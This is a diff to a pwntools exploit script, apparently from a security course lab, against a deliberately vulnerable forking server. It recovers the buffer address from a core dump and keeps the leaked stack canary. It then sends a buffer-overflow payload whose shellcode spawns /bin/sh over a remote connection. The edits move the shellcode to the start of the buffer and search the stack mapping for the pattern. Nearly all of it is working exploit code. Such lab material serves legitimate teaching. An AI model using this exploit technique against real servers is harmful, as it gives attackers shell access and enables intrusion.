@@ -14,8 +14,9 @@ Three steps:
      read buf's address out of the core dump it drops (the Morris trick from
      Problem 2). ASLR is off, so every forked child shares that address.
 
-Then inject: fill buf with [NOP sled][shellcode], keep the real canary, and set
-the return address to buf so it lands in the sled and slides into the shellcode.
+Then inject: put the shellcode at the START of buf (padded after it), keep the
+real canary, and set the return address to buf. Shellcode goes at the low end
+because ESP sits just above buf on return and its pushes grow down.
 
 Requires core dumps in the server's working directory (the VM sets
 `kernel.core_pattern = core.%p`). Start the server first (from example3):
@@ -105,7 +106,10 @@ def find_buf_addr(offset):
     if core is None:
         log.error("no core dump found -- enable cores (ulimit -c unlimited; "
                   "kernel.core_pattern = core.%p)")
-    buf_addr = next(core.search(cyclic(8)))   # first pattern bytes live at buf start
+    # Find the pattern in the STACK mapping specifically. A plain core.search()
+    # would also match a stray copy at a low (non-stack) address.
+    stack = core.stack
+    buf_addr = stack.address + stack.data.find(cyclic(8))   # pattern starts at buf
     log.warn("buf @ %#x", buf_addr)
     return buf_addr
 
@@ -117,8 +121,11 @@ def main():
 
     shellcode = asm(shellcraft.sh())       # execve("/bin/sh", 0, 0)
     assert len(shellcode) <= offset, "shellcode larger than the buffer"
-    # buf = [NOP sled][shellcode] | real canary | saved ebp | return addr = buf
-    payload = b"\x90" * (offset - len(shellcode)) + shellcode
+    # buf = [shellcode][NOP padding] | real canary | saved ebp | return addr = buf
+    # Shellcode goes at the START of buf: ESP sits above buf when handle()
+    # returns and its pushes grow down, so shellcode at the top would clobber
+    # its own tail before running. At the bottom it stays clear.
+    payload = shellcode + b"\x90" * (offset - len(shellcode))
     payload += canary + b"B" * 4 + p32(buf_addr)
 
     io = remote(HOST, PORT)
